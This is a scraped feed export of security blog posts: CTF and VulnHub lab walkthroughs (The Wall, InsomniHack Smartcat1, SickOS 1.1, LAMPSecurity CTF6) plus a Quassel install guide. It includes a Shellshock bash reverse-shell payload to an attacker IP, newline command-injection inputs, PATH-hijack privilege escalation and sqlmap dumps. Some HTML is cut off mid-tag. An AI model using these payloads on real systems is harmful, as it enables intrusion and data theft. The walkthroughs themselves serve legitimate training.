users password:</p> \n<p><img src=\"https://highon.coffee/img/blog/thewall/rogerwaters.jpg\" alt=\"Roger Waters - Pink Floyd - The Wall\" /></p> \n<h2 id=\"ssh-shell\">SSH Shell</h2> \n<p>A non privileged SSH shell was established using the previously discovered credentials.</p> \n<div class=\"note info\"> \n <h5>Username format</h5> \n <p>The uppercase characters in the username were guessed from the previous username pattern. </p> \n</div> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>RogerWaters</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>hello_is_there_anybody_in_there</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"local-system-enumeration\">Local System Enumeration</h2> \n<h3 id=\"account-rogerwaters\">Account: RogerWaters</h3> \n<p>Enumeration of the system discovered the SUID binary: <code>/usr/local/bin/brick</code></p> \n<p>Running the suid binary and answering the question correctly with <code>Nick Mason</code> change the current user to “NickMason”.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>/usr/local/bin/brick\n\nWhat have we here, laddie?\nMysterious scribbings?\nA secret code?\nOh, poems, no less!\nPoems everybody!\n\nWho is the only band member to be featured on every Pink Floyd album? : Nick\nMason\n/bin/sh: Cannot determine current working directory\n<span class=\"nv\">$ </span><span class=\"nb\">id\n</span><span class=\"nv\">uid</span><span class=\"o\">=</span>1001<span class=\"o\">(</span>NickMason<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1001<span class=\"o\">(</span>NickMason<span class=\"o\">)</span> <span class=\"nb\">groups</span><span class=\"o\">=</span>1002<span class=\"o\">(</span>RogerWaters<span class=\"o\">)</span></code></pre> \n</figure> \n<h3 id=\"account-nickmason\">Account: NickMason</h3> \n<p>Local enumeration of <code>nick_mason_profile_pic.jpg</code> discovered the file was an .ogg audio file containing morsecode data.</p> \n<h4 id=\"extracting-morse-code-data\">Extracting Morse Code Data</h4> \n<p>The ogg file contained morse code data with music playing at the same time over both stereo channels.</p> \n<p><strong>Audacity</strong> was used with a low high pass filter to help remove as much of the lower frequency music as possible, making the higher frequency morse code tones easier to hear.</p> \n<p><img src=\"https://highon.coffee/img/blog/thewall/audacity.png\" alt=\"Audacity Morse Code Low Pass Filter\" /></p> \n<p><strong>Sonic Visualiser</strong> was used in addition to help visualise the morse code dots and dashes.</p> \n<p><img src=\"https://highon.coffee/img/blog/thewall/morse-code.png\" alt=\"Sonic Visualiser Morse Code\" /></p> \n<h4 id=\"morse-code-decoded\">Morse Code Decoded</h4> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Morse Code</th> \n    <th>Character</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n <p><b>R</b></p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>..-.</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><b>F</b></p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>..</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><b>I</b></p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>...</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><b>S</b></p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>.-</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p><b>A</b></p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"discovered-credentials\">Discovered Credentials</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Username</th> \n    <th>Password</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>RichardWright</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>1943farfisa</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h3 id=\"account-richardwright\">Account: RichardWright</h3> \n<p><code>su - RichardWright</code> was possible using the above credentials.</p> \n<p>Local enumeration discovered the SUID binary <code>/usr/local/bin/shineon</code>, running the binary through <code>strings</code> discovered it called the program <code>mail</code> without specifying the absolute path.</p> \n<p>Strings output:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">load_menu\nTime - The Dark Side of the Moon\n/usr/bin/cal\nPress ENTER to <span class=\"k\">continue</span><span class=\"nb\">.</span>\nEchoes - Meddle\n/usr/bin/who\nIs There Anybody Out There? - The Wall\n/sbin/ping <span class=\"nt\">-c</span> 3 www.google.com\nKeep Talking- The Division Bell\nmail</code></pre> \n</figure> \n<h3 id=\"path-manipulation\">PATH Manipulation</h3> \n<p>The following file was created:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">/bin/echo <span class=\"s2\">\"/bin/sh\"</span> <span class=\"o\">&gt;</span> /tmp/mail</code></pre> \n</figure> \n<p>Changed directory to <code>/tmp</code> and PATH set to .</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">cd</span> /tmp\n<span class=\"nb\">export </span><span class=\"nv\">PATH</span><span class=\"o\">=</span>.</code></pre> \n</figure> \n<p>Execution of option 4 executed the mail script successfully.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>/usr/local/bin/shineon\nMenu\n\n1. Calendar\n2. Who\n3. Check Internet\n4. Check Mail\n5. Exit\n4\nKeep Talking- The Division Bell\n<span class=\"nv\">$ </span>/usr/bin/id\n<span class=\"nv\">uid</span><span class=\"o\">=</span>1003<span class=\"o\">(</span>RichardWright<span class=\"o\">)</span> <span class=\"nv\">euid</span><span class=\"o\">=</span>1004<span class=\"o\">(</span>DavidGilmour<span class=\"o\">)</span> <span class=\"nv\">gid</span><span class=\"o\">=</span>1003<span class=\"o\">(</span>RichardWright<span class=\"o\">)</span>\n<span class=\"nb\">groups</span><span class=\"o\">=</span>1003<span class=\"o\">(</span>RichardWright<span class=\"o\">)</span></code></pre> \n</figure> \n<h3 id=\"account-davidgilmour\">Account: DavidGilmour</h3> \n<p>With euid set, enumeration of DavidGimours home dir was possible.</p> \n<p>Running strings on <code>david_gilmour_profile.jpg</code> revealed the users password.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>/usr/bin/strings david_gilmour_profile_pic.jpg\n\n|Mvk\n7OnN<span class=\"o\">}</span>\nNn_<span class=\"o\">}</span>\n^<span class=\"o\">=&gt;</span>W\n<span class=\"o\">{</span>w|6\nOm?OoA\nwho_are_you_and_who_am_i</code></pre> \n</figure> \n<div class=\"note tip\"> \n <h5>URL also disclosed via Apache config</h5> \n <p>The web app URL was also disclosed at <code>/etc/httpd.conf.orig</code></p> \n</div> \n<p>Viewing <code>anotherbrick.txt</code> revealed the following:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"c\"># cat /home/DavidGilmour/anotherbrick.txt</span>\n<span class=\"c\"># Come on you raver, you seer of visions, come on you painter, you piper, you</span>\nprisoner, and shine. - Pink Floyd, Shine On You Crazy Diamond\n\nNew website <span class=\"k\">for </span>review:\npinkfloyd1965newblogsite50yearscelebration-temp/index.php\n\n<span class=\"c\"># You have to be trusted by the people you lie to. So that when they turn their</span>\nbacks on you, you<span class=\"s1\">'ll get the chance to put the knife in. - Pink Floyd, Dogs\n#</span></code></pre> \n</figure> \n<h2 id=\"web-application-enumeration\">Web Application Enumeration</h2> \n<p>Enumeration of the above web application exposed a code comment riddle:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">&lt;<span class=\"o\">!</span><span class=\"nt\">--Through</span> the window <span class=\"k\">in </span>the wall, come streaming <span class=\"k\">in </span>on sunlight wings, a\nmillion bright ambassadors of morning. - Pink Floyd, Echoes\nCan you see what the Dog sees? Perhaps hints of lightness streaming <span class=\"k\">in </span>on\nsunlight wings?--&gt;</code></pre> \n</figure> \n<p>The area of the image near the dog revealed some text strings. Using <strong>Image Magik</strong> the brightness was increased to dislcose the strings <code>/welcometothemachine</code> and <code>50696e6b466c6f796435305965617273</code></p> \n<p><img src=\"https://highon.coffee/img/blog/thewall/brighter.jpg\" alt=\"Image Magik Brightness Increase\" /></p> \n<h2 id=\"root-shell\">Root Shell</h2> \n<p>Searching for the string <code>welcomethemachine</code> discovered the following binary <code>/var/www/htdocs/welcometothemachine/PinkFloyd</code>.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">$ </span>./PinkFloyd\nPlease send your answer to Old Pink, <span class=\"k\">in </span>care of the Funny Farm. - Pink Floyd,\nEmpty Spaces\nAnswer: :)</p>","descriptionType":"text/html","publishedDate":"Wed, 02 Dec 2015 00:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/thewall/rogerwaters.jpg","linkMd5":"14a1347c6f2cc5bec3cf011930055445","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn68@2020_2/2020/08/25/01-24-54-298_390c20709a8a93d6.webp","destWidth":604,"destHeight":388,"sourceBytes":126440,"destBytes":18498,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/thewall/rogerwaters.jpg":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn68@2020_2/2020/08/25/01-24-54-298_390c20709a8a93d6.webp","https://highon.coffee/img/blog/thewall/audacity.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn31@2020_1/2020/08/25/01-25-14-618_c4dbbb0a51366e2b.webp","https://highon.coffee/img/blog/thewall/morse-code.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn4@2020_1/2020/08/25/01-25-15-613_9f8dab69198555d1.webp","https://highon.coffee/img/blog/thewall/brighter.jpg":"https://cdn.jsdelivr.net/gh/myreaderx23/cdn36@2020_3/2020/08/25/01-25-14-947_cf25a51693524d19.webp","https://highon.coffee/img/blog/thewall/thewall-root-flag.png":"https://cdn.jsdelivr.net/gh/myreaderx13/cdn39@2020_1/2020/08/25/01-25-14-534_246a2527da639353.webp"},"publishedOrCreatedDate":1598318675549},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"HowTo Install Quassel on Ubuntu","link":"https://highon.coffee/blog/howto-install-quassel-ubuntu/","description":"<p><strong>Quassel IRC</strong>, comes in two parts an IRC client and a bouncer called “Quassel Core”. Quassel Core works like a BNC, ZNC bouncer keeping your chats / channels online while you’re client machine is disconnected. GUI Quassel Clients are available for Windows, Linux and OSX - which was the deal breaker for me.</p> \n<p>Setting Quassel up from source proved to be a bit of nightmare and I spent a fair amount of time getting this right, so I thought I’d share my notes on setting up Quassel Core on Ubuntu.</p> \n<h2 id=\"install-quassel-ppa-ubuntu-repository\">Install Quassel PPA Ubuntu Repository</h2> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>add-apt-repository ppa:mamarley/quassel</code></pre>\n</figure> \n<h2 id=\"install-quassel-core-on-ubuntu\">Install Quassel Core on Ubuntu</h2> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nb\">sudo </span>apt-get <span class=\"nb\">install </span>quassel-core</code></pre>\n</figure> \n<p>Check it’s running:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">netstat <span class=\"nt\">-tulpn</span></code></pre>\n</figure> \n<p>Quassels default port is 4242:</p> \n<figure class=\"highlight\">\n <pre><code class=\"language-bash\" data-lang=\"bash\">tcp6       0      0 :::4242                 :::<span class=\"k\">*</span>                    LISTEN      -</code></pre>\n</figure> \n<p>Connect your Quassel Client to your server and follow the setup wizard.</p> \n<p>Enjoy.</p>","descriptionType":"text/html","publishedDate":"Fri, 20 Mar 2015 00:52:10 +0000","feedId":11390,"bgimg":"","linkMd5":"3047d0cadb3b77e83345f26ffca0ad89","bgimgJsdelivr":"","metaImg":"","author":"Arr0way","publishedOrCreatedDate":1598318675552},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"InsomniHack CTF Teaser - Smartcat1 Writeup","link":"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/#challenge-description\" id=\"markdown-toc-challenge-description\">Challenge Description</a></li> \n <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/#insomnihack-smartcat1\" id=\"markdown-toc-insomnihack-smartcat1\">InsomniHack Smartcat1</a></li> \n <li><a href=\"https://highon.coffee/blog/insomnihack-ctf-teaser-smartcat1-writeup/#flag\" id=\"markdown-toc-flag\">Flag</a></li> \n</ul> \n<h2 id=\"challenge-description\">Challenge Description</h2> \n<p>Exploit the web based ping command tool and capture the flag.</p> \n<p><img src=\"https://highon.coffee/img/blog/insomnihack/smartcat1.png\" alt=\"smartcat1 CTF\" /></p> \n<h2 id=\"insomnihack-smartcat1\">InsomniHack Smartcat1</h2> \n<p>Entering nothing or a <code>'</code> renders the error: <code>Error running ping -c 1 foo</code>. Enumeration indicated the following characters were filtered <code>$;&amp;|({`\\t</code> Note, that included whitespace filtering.</p> \n<p>I loaded up burp and went through the ASCII table for other ways of escaping the command. It was possible to use LF <code>%0a</code> to escape the existing command and enter another such as: <code>dest=8.8.8.8%0als</code>.</p> \n<p>Viewing the source code of <code>index.cgi</code> confirmed the character filtering.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-python\" data-lang=\"python\"><span class=\"c1\">#!/usr/bin/env python\n</span>\n<span      <span class=\"n\">results</span> <span class=\"o\">=</span> <span class=\"s\">\"Error running \"</span> <span class=\"o\">+</span> <span class=\"s\">\"ping -c 1 \"</span><span id=\"flag\">Flag</h2> \n<p>Entering <code>dest=%0afind</code> listed the current directory, revealing the path of the flag.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"nv\">dest</span><span class=\"o\">=</span>8.8.8.8%0acat&lt;./there/is/your/flag/or/maybe/not/what/do/you/think/really/please/tell/me/seriously/though/here/is/the/flag</code></pre> \n</figure> \n<p>Flag contents:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">INS<span class=\"o\">{</span>warm_kitty_smelly_kitty_flush_flush_flush<span class=\"o\">}</span></code></pre> \n</figure> \n<p>Thanks for the CTF :)</p>","descriptionType":"text/html","publishedDate":"Mon, 18 Jan 2016 14:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/insomnihack/smartcat1.png","linkMd5":"01a9698062b8671e36f9f3fb7a7c30cd","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn72@2020_6/2020/08/25/01-24-54-475_9f541696f74fd281.webp","destWidth":660,"destHeight":346,"sourceBytes":218173,"destBytes":25132,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/insomnihack/smartcat1.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn72@2020_6/2020/08/25/01-24-54-475_9f541696f74fd281.webp"},"publishedOrCreatedDate":1598318675546},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"SickOS 1.1 - Walkthrough","link":"https://highon.coffee/blog/sickos-1-walkthrough/","description":"<div class=\"coffee-rating\"> \n <table> \n  <tbody> \n   <tr> \n    <td> <p><code>Coffee Difficulty Rating:</code></p> </td> \n    <td> <p><i class=\"fa fa-coffee\"></i><i class=\"fa fa-coffee\"></i></p> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#host-enumeration\" id=\"markdown-toc-host-enumeration\">Host Enumeration</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#port-scanning\" id=\"markdown-toc-port-scanning\">Port Scanning</a></li> \n   <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#service-enumeration\" id=\"markdown-toc-service-enumeration\">Service Enumeration</a></li> \n  </ul> </li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#squid-enumeration\" id=\"markdown-toc-squid-enumeration\">Squid Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#nikto-scan-via-proxy\" id=\"markdown-toc-nikto-scan-via-proxy\">Nikto scan via Proxy</a></li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#shellshock-bash-reverse-shell\" id=\"markdown-toc-shellshock-bash-reverse-shell\">Shellshock Bash Reverse Shell</a></li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#local-enumeration\" id=\"markdown-toc-local-enumeration\">Local Enumeration</a></li> \n <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#local-privilege-escalation\" id=\"markdown-toc-local-privilege-escalation\">Local Privilege Escalation</a> \n  <ul> \n   <li><a href=\"https://highon.coffee/blog/sickos-1-walkthrough/#root-flag\" id=\"markdown-toc-root-flag\">Root Flag</a></li> \n  </ul> </li> \n</ul> \n<h2 id=\"author-description\">Author Description</h2> \n<p>This CTF gives a clear analogy how hacking strategies can be performed on a network to compromise it in a safe environment. This vm is very similar to labs I faced in OSCP. The objective being to compromise the network/machine and gain Administrative/root privileges on them.</p> \n<p><strong>Author:</strong> <a href=\"https://twitter.com/D4rk36\">@D4rk36</a></p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<h2 id=\"host-enumeration\">Host Enumeration</h2> \n<h3 id=\"port-scanning\">Port Scanning</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.138</code></pre> \n</figure> \n<h3 id=\"service-enumeration\">Service Enumeration</h3> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 22</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>SSH</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>OpenSSH 5.9p1 Debian 5ubuntu1.1 (Ubuntu Linux; protocol 2.0)</p> \n     </pc> </td> \n   </tr> \n   <tr> \n    <td> \n     <pc> \n      <p><code>TCP: 3128</code></p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>HTTP-Proxy</p> \n     </pc> </td> \n    <td> \n     <pc> \n      <p>Squid http proxy 3.1.19</p> \n     </pc> </td> \n   </tr> \n  </tbody> \n </table> \n</div> \n<h2 id=\"squid-enumeration\">Squid Enumeration</h2> \n<p>Inspection of Squid using the metasploit module <code>auxiliary/scanner/http/squid_pivot_scanning</code> discovered port 80 was exposed via the proxy.</p> \n<p><img src=\"https://highon.coffee/img/blog/sickos/metasploit-squid-pivot-scanning.png\" alt=\"Metasploit Squid Pivot Scanning\" /></p> \n<h2 id=\"nikto-scan-via-proxy\">Nikto scan via Proxy</h2> \n<p>Nikto was configured to use the discovered Squid proxy:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nikto <span class=\"nt\">-h</span> 192.168.221.138 <span class=\"nt\">-useproxy</span> http://192.168.221.138:3128</code></pre> \n</figure> \n<p>Nikto disclosed the location <code>/cgi-bin/status</code>, indicating the target could be vulnerable to <strong>shellshock</strong>.</p> \n<p><img src=\"https://highon.coffee/img/blog/sickos/nikto-proxy-scan.png\" alt=\"Nikto Proxy Scan\" /></p> \n<h2 id=\"shellshock-bash-reverse-shell\">Shellshock Bash Reverse Shell</h2> \n<p><strong>Burp Suite</strong> was used to manipulate <code>User-Agent:</code> to include the bash reverse shell.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">()</span> <span class=\"o\">{</span> ignored<span class=\"p\">;</span><span class=\"o\">}</span><span class=\"p\">;</span>/bin/bash <span class=\"nt\">-i</span> <span class=\"o\">&gt;</span>&amp; /dev/tcp/192.168.221.139/443 0&gt;&amp;1</code></pre> \n</figure> \n<p><img src=\"https://highon.coffee/img/blog/sickos/burp-shellshock-reverse-shell.png\" alt=\"Burp Suite Shellshock Reverse Bash Shell\" /></p> \n<p>A reverse shell was established:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# nc.traditional <span class=\"nt\">-lp</span> 443 <span class=\"nt\">-vvv</span>\nlistening on <span class=\"o\">[</span>any] 443 ...\n\n192.168.221.138: inverse host lookup failed: Unknown host\nconnect to <span class=\"o\">[</span>192.168.221.139] from <span class=\"o\">(</span>UNKNOWN<span class=\"o\">)</span> <span class=\"o\">[</span>192.168.221.138] 59815\nbash: no job control <span class=\"k\">in </span>this shell\nwww-data@SickOs:/usr/lib/cgi-bin<span class=\"err\">$</span></code></pre> \n</figure> \n<h2 id=\"local-enumeration\">Local Enumeration</h2> \n<p>Local enumeration of the system disclosed the file <code>/var/www/wolfcms/config.php</code> containing:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">// Database settings:\ndefine<span class=\"o\">(</span><span class=\"s1\">'DB_DSN'</span>, <span class=\"s1\">'mysql:dbname=wolf;host=localhost;port=3306'</span><span class=\"o\">)</span><span class=\"p\">;</span>\ndefine<span class=\"o\">(</span><span class=\"s1\">'DB_USER'</span>, <span class=\"s1\">'root'</span><span class=\"o\">)</span><span class=\"p\">;</span>\ndefine<span class=\"o\">(</span><span class=\"s1\">'DB_PASS'</span>, <span class=\"s1\">'john@123'</span><span class=\"o\">)</span><span class=\"p\">;</span>\ndefine<span class=\"o\">(</span><span class=\"s1\">'TABLE_PREFIX'</span>, <span class=\"s1\">''</span><span class=\"o\">)</span><span class=\"p\">;</span></code></pre> \n</figure> \n<h2 id=\"local-privilege-escalation\">Local Privilege Escalation</h2> \n<p>The previously discovered credentials worked for MySQL root, and were reused for the user <code>sickos</code> and again for <code>sudo</code> as the user <code>sickos</code>.</p> \n<p>Local Privilege Escalation:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">www-data@SickOs:/<span class=\"nv\">$ </span>su - sickos\nsu - sickos\nPassword: john@123\n\nsickos@SickOs:~<span class=\"nv\">$ </span><span class=\"nb\">ls\nls\n</span>sickos@SickOs:~<span class=\"nv\">$ </span><span class=\"nb\">cat</span> .bash_history\n<span class=\"nb\">cat</span> .bash_history\n<span class=\"nb\">sudo </span>su\n<span class=\"nb\">exit\n</span>sickos@SickOs:~<span class=\"nv\">$ </span><span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n<span class=\"nb\">sudo</span> <span class=\"nt\">-s</span>\n<span class=\"o\">[</span><span class=\"nb\">sudo</span><span class=\"o\">]</span> password <span class=\"k\">for </span>sickos: john@123\n\nroot@SickOs:~# <span class=\"nb\">cd</span> /root  \n<span class=\"nb\">cd</span> /root\nroot@SickOs:/root# <span class=\"nb\">ls\nls\n</span>a0216ea4d51874464078c618298b1367.txt\nroot@SickOs:/root# <span class=\"nb\">cat </span>a0216ea4d51874464078c618298b1367.txt\n<span class=\"nb\">cat </span>a0216ea4d51874464078c618298b1367.txt\nIf you are viewing this!!\n\nROOT!\n\nYou have Succesfully completed SickOS1.1.\nThanks <span class=\"k\">for </span>Trying\n\n\nroot@SickOs:/root#</code></pre> \n</figure> \n<h3 id=\"root-flag\">Root Flag</h3> \n<p><img src=\"https://highon.coffee/img/blog/sickos/root-flag.png\" alt=\"Sickos 1.1 Root Flag\" /></p> \n<p>Thanks for the VM :)</p>","descriptionType":"text/html","publishedDate":"Fri, 11 Dec 2015 11:00:10 +0000","feedId":11390,"bgimg":"https://highon.coffee/img/blog/sickos/metasploit-squid-pivot-scanning.png","linkMd5":"4bfe00c3baeaa08ed20386ee65dfcd3d","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn80@2020_3/2020/08/25/01-24-54-555_2d2a5d10241f1bf2.webp","destWidth":1089,"destHeight":728,"sourceBytes":337751,"destBytes":112060,"author":"Arr0way","articleImgCdnMap":{"https://highon.coffee/img/blog/sickos/metasploit-squid-pivot-scanning.png":"https://cdn.jsdelivr.net/gh/myreaderx10/cdn80@2020_3/2020/08/25/01-24-54-555_2d2a5d10241f1bf2.webp","https://highon.coffee/img/blog/sickos/nikto-proxy-scan.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn88@2020_1/2020/08/25/01-25-15-975_0546c1dcdc8f0f9f.webp","https://highon.coffee/img/blog/sickos/burp-shellshock-reverse-shell.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn78@2020_2/2020/08/25/01-25-14-587_05d0a7b26f840233.webp","https://highon.coffee/img/blog/sickos/root-flag.png":"https://cdn.jsdelivr.net/gh/myreaderx30/cdn99@2020_3/2020/08/25/01-25-16-340_d913b25bb3778e26.webp"},"publishedOrCreatedDate":1598318675547},{"createdTime":"2020-08-25 09:24:35","updatedTime":"2020-08-25 09:24:35","title":"LAMP Security CTF6 - Walkthrough","link":"https://highon.coffee/blog/lamp-security-ctf6-walkthrough/","description":"<div \n </table> \n</div> \n<ul id=\"markdown-toc\"> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf6-walkthrough/#author-description\" id=\"markdown-toc-author-description\">Author Description</a></li> \n <li><a href=\"https://highon.coffee/blog/lamp-security-ctf6-walkthrough/#enumeration\" id=\"markdown-toc-enumeration\">Enumeration</a> \n  <ul> \n   <li><a id=\"author-description\">Author Description</h2> \n<p>The LAMPSecurity project is an effort to produce training and benchmarking tools that can be used to educate information security professionals and test products.</p> \n<p><strong>Author:</strong> madirish2600</p> \n<p><strong>Download:</strong> <a href=\"https://www.vulnhub.com\">VulnHub</a></p> \n<div class=\"note info\"> \n <h5>Dislcaimer: Multiple Entry Points</h5> \n <p>The LAMPSecurity series is not particularly challenging, for each VM in the series I've targeted the <b>web application</b> as the entry point.</p> \n</div> \n<h2 id=\"enumeration\">Enumeration</h2> \n<h3 id=\"host-service-enumeration\">Host Service Enumeration</h3> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\">nmap <span class=\"nt\">-v</span> <span class=\"nt\">-p</span> 1-65535 <span class=\"nt\">-sV</span> <span class=\"nt\">-O</span> <span class=\"nt\">-sT</span> 192.168.30.131</code></pre> \n</figure> \n<div class=\"mobile-side-scroller\"> \n <table> \n  <thead> \n   <tr> \n    <th>Port</th> \n    <th>Service</th> \n    <th>Version Detection</th> \n   </tr> \n  </thead> \n  <tbody> \n   <tr> \n \n<h2 id=\"web-application-enumeration\">Web Application Enumeration</h2> \n<p>Inspection of the Web Application indicated it was vulnerable to SQL injection.</p> \n<h2 id=\"sqlmap---sql-injection\">SQLMap - SQL Injection</h2> \n<p>SQLMap confirmed SQL injection was possible.</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span> root:~]# sqlmap <span class=\"nt\">-o</span> <span class=\"nt\">-u</span> <span class=\"s2\">\"http://192.168.221.131/?action=login\"</span> <span class=\"nt\">--forms</span> <span class=\"nt\">--dbs</span>\n\navailable databases <span class=\"o\">[</span>5]:\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> cms\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> information_schema\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> mysql\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> roundcube\n<span class=\"o\">[</span><span class=\"k\">*</span><span class=\"o\">]</span> <span class=\"nb\">test</span></code></pre> \n</figure> \n<p>SQLMap form enumeration:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# sqlmap <span class=\"nt\">-o</span> <span class=\"nt\">-u</span> <span class=\"s2\">\"http://192.168.221.131/?action=login\"</span> <span class=\"nt\">--forms</span>  <span class=\"nt\">-D</span> cms\n<span class=\"nt\">--tables</span>\n\nDatabase: cms\n<span class=\"o\">[</span>3 tables]\n+-------+\n| user  |\n| event |\n| log   |\n+-------+</code></pre> \n</figure> \n<p>SQLMap database dump + admin account hash cracked:</p> \n<figure class=\"highlight\"> \n <pre><code class=\"language-bash\" data-lang=\"bash\"><span class=\"o\">[</span>root:~]# sqlmap <span class=\"nt\">-o</span> <span class=\"nt\">-u</span> <span 